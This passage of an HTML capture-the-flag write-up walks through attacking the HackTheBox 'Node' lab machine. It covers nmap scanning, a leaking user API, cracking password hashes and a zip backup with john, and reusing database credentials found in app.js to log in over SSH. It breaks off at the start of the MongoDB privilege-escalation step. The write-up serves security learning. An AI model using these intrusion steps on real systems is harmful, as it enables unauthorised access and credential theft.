@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Node</strong></h1>
+        <em>Released: 14th October 2017 / Pwned: 18th October 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Node has you attacking Node.js with a MongoDB database behind it. By carefully watching the web requests in Burp, you'll find an API which will reveal hashed passwords, leading to a obfuscated backup file whcih gives ssh credentials. As a low privilege user on the system, you elevate to a higher privileged user by inserting code into a MongoDB database. To get root, you overflow a buffer in SUID binary and execute a ret2libc attack.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.58</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 22,3000 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.58</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-allports.txt&nbsp;10.10.10.58<br>
+                [..]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                3000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ppp<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;nmap&nbsp;-p&nbsp;22,3000&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-openports.txt&nbsp;10.10.10.58<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;dc<span style="color:#ff9d00;font-weight:700">:</span>5e<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>a6<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>db<span style="color:#ff9d00;font-weight:700">:</span>43<span style="color:#ff9d00;font-weight:700">:</span>ec<span style="color:#ff9d00;font-weight:700">:</span>eb<span style="color:#ff9d00;font-weight:700">:</span>40<span style="color:#ff9d00;font-weight:700">:</span>f4<span style="color:#ff9d00;font-weight:700">:</span>96<span style="color:#ff9d00;font-weight:700">:</span>7b<span style="color:#ff9d00;font-weight:700">:</span>8e<span style="color:#ff9d00;font-weight:700">:</span>d1<span style="color:#ff9d00;font-weight:700">:</span>da&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;6c<span style="color:#ff9d00;font-weight:700">:</span>8e<span style="color:#ff9d00;font-weight:700">:</span>5e<span style="color:#ff9d00;font-weight:700">:</span>5f<span style="color:#ff9d00;font-weight:700">:</span>4f<span style="color:#ff9d00;font-weight:700">:</span>d5<span style="color:#ff9d00;font-weight:700">:</span>41<span style="color:#ff9d00;font-weight:700">:</span>7d<span style="color:#ff9d00;font-weight:700">:</span>18<span style="color:#ff9d00;font-weight:700">:</span>95<span style="color:#ff9d00;font-weight:700">:</span>d1<span style="color:#ff9d00;font-weight:700">:</span>dc<span style="color:#ff9d00;font-weight:700">:</span>2e<span style="color:#ff9d00;font-weight:700">:</span>3f<span style="color:#ff9d00;font-weight:700">:</span>e5<span style="color:#ff9d00;font-weight:700">:</span>9c&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;d8<span style="color:#ff9d00;font-weight:700">:</span>78<span style="color:#ff9d00;font-weight:700">:</span>b8<span style="color:#ff9d00;font-weight:700">:</span>5d<span style="color:#ff9d00;font-weight:700">:</span>85<span style="color:#ff9d00;font-weight:700">:</span>ff<span style="color:#ff9d00;font-weight:700">:</span>ad<span style="color:#ff9d00;font-weight:700">:</span>7b<span style="color:#ff9d00;font-weight:700">:</span>e6<span style="color:#ff9d00;font-weight:700">:</span>e2<span style="color:#ff9d00;font-weight:700">:</span>b5<span style="color:#ff9d00;font-weight:700">:</span>da<span style="color:#ff9d00;font-weight:700">:</span>1e<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>62<span style="color:#ff9d00;font-weight:700">:</span>36&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                3000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;hadoop-datanode&nbsp;Apache&nbsp;Hadoop<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;hadoop-datanode-info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Logs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/login</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;hadoop-tasktracker-info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Logs<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/login</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;MyPlace<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <strong>Analysis of results:</strong><br>
+        • <code>22/ssh</code> - Nothing to attack here, but useful to know for later<br>
+        • <code>3000/http</code> - Nmap's script scan has gotten it wrong here, it's not Apache Hadoop. However, there's /login URL nonetheless.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 3000/http - MyPlace</strong></h2><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We can't directory bruteforce the site, because it always returns status code 200, even if a page doesn't exist.<br>
+        <br>
+        Proxy your traffic through Burp.<br>
+        <em>Firefox settings &gt; General &gt; Network Porxy (at the bottom)</em><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Navigate to Proxy &gt; HTTP history in Burp.<br>
+        If you browse to a user profile, like Tom, you'll see the URL being accessed to retrieve Tom's profile information - <code>/api/users/tom</code><br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Browse to <code>http://node.htb:3000/api/users/tom</code>, and you'll find Tom's password.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Browse to <code>http://node.htb:3000/api/users</code>, and you'll find the usernames and passwords of all users on the site.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        These passwords are sha256 hashes.<br>
+        <br>
+        Drop the hashes into CrackStation - <a href="https://crackstation.net/">https://crackstation.net/</a> - (or hashcat or John if you feel like doing it yourself), and you'll have a set of passwords.<br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <code>http://node.htb:3000/api/users</code> revealed that <code>myP14ceAdm1nAcc0uNT</code> is the admin user - <code>is_admin: true</code> - so log in <code>http://node.htb:3000/login</code> with <code>myP14ceAdm1nAcc0uNT</code>'s credentials:<br>
+        <br>
+        <code>myP14ceAdm1nAcc0uNT / manchester</code><br>
+        <br>
+        There's a backup we can download. Grab it :)<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) myplace.backup</strong></h2><br>
+        <code>file</code> reports that the file is ASCII text.<br>
+        If you read the file with <code>strings</code>, the ASCII looks a lot like base 64.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;myplace.backup&nbsp;<br>
+                myplace.backup<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ASCII&nbsp;text,&nbsp;with&nbsp;very&nbsp;long&nbsp;lines,&nbsp;with&nbsp;no&nbsp;line&nbsp;terminators<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;strings&nbsp;myplace.backup&nbsp;<br>
+                UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWezipl11eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Decode the base64 with <code>base64 -d</code>.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;myplace.backup&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;myplace.backup.b64d<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;myplace.backup.b64d&nbsp;<br>
+                myplace.backup.b64d<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Zip&nbsp;archive&nbsp;data,&nbsp;at&nbsp;least&nbsp;v1.0&nbsp;to&nbsp;extract<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">unzip</span>&nbsp;myplace.backup.b64d<br>
+                Archive<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;myplace.backup.b64d<br>
+                [myplace.backup.b64d]&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>package-lock.json&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <code>myplace.backup</code> is a password protected zip file.<br>
+        Extract the zip hash with <code>zip2john</code> and crack it using <code>john</code> and <code>rockyou.txt</code>.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;zip2john&nbsp;myplace.backup.b64d&nbsp;&gt;&nbsp;zip_hash<br>
+                [...]<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;zip_hash&nbsp;<br>
+                myplace.backup.b64d<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$pkzip2$3</span>*2*1*0*8*24*9c88*1223*71439b52d517496bf6a3da0ead8674734fa0c83c4ae1032d0d413150bb6895863af54fc6*1*0*8*24*37ef*0145*4c66a2eb2b41e7c1a1f307d8938724cb56af4eac9dd0b099fe5e5ac322aa3e68e2daf41e*2*0*11*5*118f1dfc*94cb*67*0*11*118f*3d0f*62874b5b9ac798845aff44d9271f87ef55*$<span style="color:#ff9d00;font-weight:700">/</span>pkzip2$<span style="color:#ff9d00;font-weight:700">::</span>myplace.backup.b64d<span style="color:#ff9d00;font-weight:700">:</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span>qs<span style="color:#ff9d00;font-weight:700">/</span>.eslintignore,&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span>serve-static<span style="color:#ff9d00;font-weight:700">/</span>README.md,&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>package-lock.json<span style="color:#ff9d00;font-weight:700">:</span>myplace.backup.b64d<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;john&nbsp;--wordlist=<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt&nbsp;zip_hash&nbsp;<br>
+                Using&nbsp;default&nbsp;input&nbsp;encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UTF-8<br>
+                Loaded&nbsp;1&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">hash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>PKZIP&nbsp;[32<span style="color:#ff9d00;font-weight:700">/</span>32]<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
+                Press&nbsp;<span style="color:#3ad900;font-weight:400">'q'</span>&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">status</span><br>
+                magicword&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(myplace.backup.b64d)<br>
+                1g&nbsp;0:00:00:00&nbsp;DONE&nbsp;(2019-10-16&nbsp;10:57)&nbsp;25.00g/s&nbsp;4608Kp/s&nbsp;4608Kc/s&nbsp;4608KC/s&nbsp;sandrea..joan08
+            </div>
+        </div><br>
+        <br>
+        The password is <code>magicword</code>.<br>
+        Extract the zip with <code>unzip</code>, and the a backup of the website will unpack.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">unzip</span>&nbsp;myplace.backup.b64d<br>
+                Archive<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;myplace.backup.b64d<br>
+                &nbsp;&nbsp;&nbsp;creating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span><br>
+                [myplace.backup.b64d]&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>package-lock.json&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;magicword<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>package-lock.json&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;creating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;creating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span>serve-static<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span>serve-static<span style="color:#ff9d00;font-weight:700">/</span>README.md&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span>serve-static<span style="color:#ff9d00;font-weight:700">/</span>index.js&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<span style="color:#ff9d00;font-weight:700">/</span>node_modules<span style="color:#ff9d00;font-weight:700">/</span>serve-static<span style="color:#ff9d00;font-weight:700">/</span>LICENSE&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;[...]
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) app.js</strong></h2><br>
+        Browse the backup and have a look at <code>app.js</code>.<br>
+        You'll find mark's credentials for accessing MongoDB - <code>mark / 5AYRft73VtFpc84k</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l<br>
+                total&nbsp;48<br>
+                -rw-rw<span style="color:#ffdd00;font-weight:400">-r</span>--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;3861&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;app.html<br>
+                -rw-rw<span style="color:#ffdd00;font-weight:400">-r</span>--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;8058&nbsp;Sep&nbsp;&nbsp;3&nbsp;&nbsp;2017&nbsp;app.js<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;69&nbsp;root&nbsp;root&nbsp;&nbsp;4096&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;node_modules<br>
+                -rw-rw<span style="color:#ffdd00;font-weight:400">-r</span>--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;283&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;package.json<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;21264&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;package-lock.json<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;6&nbsp;root&nbsp;root&nbsp;&nbsp;4096&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;static<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">/</span>3000<span style="color:#ff9d00;font-weight:700">/</span>myP14ceAdm1nAcc0uNT<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>myplace#&nbsp;<span style="color:#ff9d00;font-weight:700">less</span>&nbsp;app.js<br>
+                [...]<br>
+                const&nbsp;MongoClient&nbsp;=&nbsp;require<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'mongodb'</span><span style="color:#ff9d00;font-weight:700">)</span>.MongoClient<span style="color:#ff9d00;font-weight:700">;</span><br>
+                const&nbsp;ObjectID&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;require<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'mongodb'</span><span style="color:#ff9d00;font-weight:700">)</span>.ObjectID<span style="color:#ff9d00;font-weight:700">;</span><br>
+                const&nbsp;path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;require<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"path"</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                const&nbsp;spawn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;require<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'child_process'</span><span style="color:#ff9d00;font-weight:700">)</span>.spawn<span style="color:#ff9d00;font-weight:700">;</span><br>
+                const&nbsp;app&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ffdd00;font-weight:400">express()</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                const&nbsp;url&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace'</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                const&nbsp;backup_key&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474'</span><span style="color:#ff9d00;font-weight:700">;</span>
+            </div>
+        </div><br>
+        <br>
+        I couldn't find any other information in the backup, and mark was a new set of credentials we'd found, so tried them with ssh. It worked!<br>
+        <br>
+        Log in as mark to Node using his MongoDB credentials - <code>mark / 5AYRft73VtFpc84k</code>.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>node#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;mark@node.htb<br>
+                mark@node.htbs&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;5AYRft73VtFpc84k<br>
+                [...]<br>
+                mark@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to tom</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) MongoDB</strong></h2><br>
+        If you read everyone's home directory, you'll see that <code>user.txt</code> is in <code>tom</code>'s home.<br>
+        In that case, we need to elevate to <code>tom</code>.<br>
+            <div class="codebox">
+                mark@node<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>*<br>
+                [...]<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>tom<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;40K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;6&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;3&nbsp;&nbsp;2017&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;5&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Aug&nbsp;31&nbsp;&nbsp;2017&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;220&nbsp;Aug&nbsp;29&nbsp;&nbsp;2017&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;3.7K&nbsp;Aug&nbsp;29&nbsp;&nbsp;2017&nbsp;.bashrc<br>
+                drwx------&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Aug&nbsp;29&nbsp;&nbsp;2017&nbsp;.cache<br>
